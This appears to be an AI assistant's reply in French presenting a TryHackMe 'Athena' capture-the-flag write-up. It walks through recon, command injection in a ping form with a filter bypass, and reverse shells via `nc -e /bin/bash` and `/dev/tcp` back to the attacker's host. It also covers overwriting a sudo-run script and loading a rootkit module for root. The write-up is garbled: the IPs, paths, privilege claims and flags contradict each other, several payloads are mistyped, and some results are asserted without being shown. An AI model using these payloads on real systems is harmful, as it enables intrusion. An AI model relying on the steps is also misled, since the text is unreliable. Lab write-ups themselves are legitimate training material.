Bien sûr, je vais te fournir un **write-up détaillé** pour la machine **Athena** sur TryHackMe, en suivant le format du write-up précédent que tu as partagé. Ce guide te guidera à travers les étapes d'énumération, d'exploitation et d'élévation de privilèges pour obtenir les flags utilisateur et root.

---

# Write-Up : Machine Athena - TryHackMe

## 🖥️ Informations Générales

- **Nom de la machine** : Athena
- **Difficulté** : Moyenne
- **Outils utilisés** : `nmap`, `gobuster` `smbcliemt`, `Burp Suite`, `netcat`
- **Objectif** : Obtenir un accès root et récupérer les flags utilisateur et root

---

## 🕵️‍♂️ Reconnaissance

### 🔍 Scan des ports avec Nmap

Nous commençons par un scan des ports pour identifier les services en cours d'exécution sur la machine cible.

```bash
nmap -sC -sV -oN 10.12.13.14
```

**Options utilisées** :

- `-sC` : Exécute les scripts par défaut de Nmap.
- `-sV` : Détermine les versions des services.
- `-oN` : Enregistre les résultats dans un fichier nommé `initial`.

**Résultats** :

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Les ports **22 (SSH)** et **80 (HTTP)** sont ouverts.

### 🌐 Analyse du service HTTP

En naviguant vers `http://10.12.13.14`, nous trouvons une page web par défaut d'Apache. Pour approfondir, nous utilisons `gobuster` pour découvrir des répertoires cachés.

```bash
gobuster dir -u http://10.12.13.14 -w /usr/share/wordlists/dirb/common.txt
```

**Résultats** : Solution 1

```
/myrouterpanel (Status: 200)
/index.html (Status: 200)
```

Le répertoire `/myrouterpanel` semble intéressant.

**Résultats** : Solution 2

```bash
smbclient -L //10.12.13.14
```
```bash
smbclient \\\\10.10.6.41\\public
```
On tombera sur un joli fichier Administrateur qui attend d'être téléchargé par nos soins!

---

## 🎯 Exploitation

### 🛠️ Analyse de `/myrouterpanel`

En accédant à `http://10.12.13.14/myrouterpanel`, nous trouvons un formulaire permettant de pinger une adresse IP. Cela suggère une possible vulnérabilité à l'injection de commandes.

### 🚨 Test d'injection de commandes

Nous interceptons la requête avec **Burp Suite** et modifions le paramètre `ip` pour tester une injection de commande.

**Requête originale** :

```
POST /myrouterpanel/ping.php HTTP/1.1
Host: 10.10.10.10
Content-Type: application/x-www-form-urlencoded

ip=8.8.8.8&submit=Ping
```

**Modification pour tester l'injection** :

```
ip=8.8.8.8; whoami
```

**Réponse** :

```
Attempt Hacking!
```

Il semble qu'un filtre soit en place pour détecter les tentatives d'injection.

### 🛡️ Contournement du filtre

Pour contourner le filtre, nous essayons différentes techniques, notamment l'utilisation de la syntaxe `$()` pour l'exécution de commandes.

**Payload** :

```
ip=8.8.8.8$(whoami)
```

**Réponse** :

Si la réponse inclut le nom d'utilisateur du système, cela confirme la vulnérabilité.

### 🐚 Obtention d'un reverse shell

Pour obtenir un accès interactif, nous établissons un reverse shell.

**Sur notre machine** :

```bash
nc -lvnp 4444
```

**Payload envoyé** :

Le payload peut être envoyé via Burpsuite ou directement depuis la page web

```
ip=127.0.01+-c1$(nc+-1p+4444+-e+/bin/bash)&submit=
```

**Résultat** :

Nous obtenons un shell sur la machine cible.

---

## 🚀 Élévation de Privilèges pour être Athena

### 🔍 Analyse du système

Une fois connecté, nous explorons le système pour identifier des vecteurs potentiels d'élévation de privilèges.

**Commande** :

```bash
sudo -l
```

**Résultat** :

```
User may run the following commands on athena:
    (ALL) NOPASSWD: /usr/bin/backup.sh
```

L'utilisateur a la permission d'exécuter le script `/usr/bin/backup.sh` avec des privilèges root sans mot de passe.

### 📝 Analyse du script `backup.sh`

En examinant le script, nous trouvons une section où les fichiers sont copiés et compressés. Cela offre une opportunité d'injection de commandes.

**Contenu du script** :

```bash
#!/bin/bash
cp /var/www/html/notes/* /backup/
tar -czf /backup/notes.tar.gz /backup/*
```

### 💡 Exploitation

Nous modifions le script pour inclure une commande qui nous donne un shell root.

**Modification** :

Tape directement cette commande dans: cd /usr/share/backup

```bash
echo "/bin/sh -i >& /dev/tcp/>ton_ip_host>/4466 0>&1" > backup.sh
```

**Exécution** :

```bash
sudo /usr/bin/backup.sh
```

**Sur notre machine** :

```bash
nc -lvnp 4466
```

**Résultat** :

Nous obtenons un shell avec les privilèges Athena.

## 🏆 Récupération des Flags
 
### 📄 Flag Utilisateur
 
```bash
cat /home/athena/user.txt
```

**Contenu** :
```
857c4a4fbac638************ (envoie un message pour la suite)
```

---

## 🚀 Élévation de Privilèges pour être root

Avec sudo -l, une fois dans Athena, nous remarquons un fichier suspect... nommé venom.ko
N'hésitez pas à aller voir le descriptif du fichier sur le web, vous comprendrez mieux la suite des manipulations.

Pour l'élévation de privilège voici ce que vous devez écrire dans votre terminal, vŕifié votre id et voilà.

```bash
sudo usr/sbin/insmod /mnt/.../secret/venom.ko
lsmod | grep -i vemom

kill -57 271

id
```

### 📄 Flag Root

```bash
cat /root/root.txt
```

**Contenu** :

```
857c4a4fbac638************ (envoie un message pour la suite)

```



---

## 📚 Conclusion

- **Reconnaissance** : Identification des services et des répertoires intéressants.
- **Exploitation** : Injection de commandes via le formulaire de ping.
- **Élévation de Privilèges** : Utilisation d'un script avec des permissions sudo pour obtenir un shell root.
- **Récupération des Flags** : Accès aux flags utilisateur et root.

**Machine compromise avec succès !** 🎉

---

*Note : Ce write-up est à des fins éducatives uniquement. Toute utilisation malveillante des informations fournies est strictement interdite.*

---
